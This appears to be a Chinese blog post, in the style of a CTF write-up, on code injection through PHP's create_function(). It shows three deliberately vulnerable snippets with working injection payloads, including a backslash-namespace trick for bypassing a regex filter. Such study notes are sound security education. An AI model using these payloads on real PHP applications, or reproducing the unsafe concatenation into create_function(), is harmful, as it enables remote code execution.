---

layout:     post                    # 使用的布局（不需要改）
title:      create_function()注入               # 标题 
subtitle:    #副标题
date:       2020-01-07              # 时间
author:     Von                      # 作者
header-img: img/post-bg-mma-0.jpg
catalog: true                       # 是否归档
tags:                               #标签
    - Web
    - CTF
    - PHP 

---

# create_function()介绍
php中使用create_function()来创建匿名函数。具体用法举例如下:
``` php
create_function('$fname','echo $fname."Zhang"')
```
其等价于
``` php
function fT($fname) {
  echo $fname."Zhang";
}
```

# create_function()的利用

## 1
先来看一段有问题的代码。
``` php
<?php
$id=$_GET['id'];
$str2='echo  '.$a.'test'.$id.";";
echo $str2;
echo "<br/>";
echo "==============================";
echo "<br/>";
$f1 = create_function('$a',$str2);
echo "<br/>";
echo "==============================";
?>
```
payload为:
``` php
?id=;}phpinfo();/*
```
当进行传参后,等价的函数为:
``` php
function f1($a)
{
    echo $a.'test';}
    phpinfo();/*
    ;
}
```
![](/blog_img/create-1.png)

## 2
``` php
<?php
//how to exp this code
$sort_by=$_GET['sort_by'];
$sorter='strnatcasecmp';
$databases=array('test','test');
$sort_function = '  return 1 * ' . $sorter . '($a["' . $sort_by . '"], $b["' . $sort_by . '"]);';
usort($databases, create_function('$a, $b', $sort_function));
?>
```

payload为:
``` php
?sort_by="]);}phpinfo();/*
```

## 3
``` php
<?php
$action = $_GET['action'] ?? '';
$arg = $_GET['arg'] ?? '';

if(preg_match('/^[a-z0-9_]*$/isD', $action)) {
    show_source(__FILE__);
} else {
    $action('', $arg);
}
```
这道题是p牛出的一道题。首先要求不能以字母,数字,下划线开头。思路是在函数的开头加入特定的字符，既能绕过正则又能让函数正常执行。  
经过fuzz,发现在函数前面加入%5c(\\),可以达到以上目的，至于为什么是%5c，p神给出了答案。  
>php里默认命名空间是\，所有原生函数和类都在这个命名空间中。普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径；而如果写\function_name() 这样调用函数，则其实是写了一个绝对路径。如果你在其他namespace里调用系统类，就必须写绝对路径这种写法。

接下来的部分，就是要我们可以利用一个函数，然后我们可控它的第二个参数。在这里我们就想到了create_function()函数，于是我们可以构造这样的payload.
``` php
?action=%5ccreate_function&arg=;}scandir("./");/*
```

# 参考文章
[kevens的文章](https://kevens10.github.io/articles/create_function()%E6%B3%A8%E5%85%A5%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html);  
[f1sh的文章](http://f1sh.site/2018/11/25/code-breaking-puzzles%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/)  





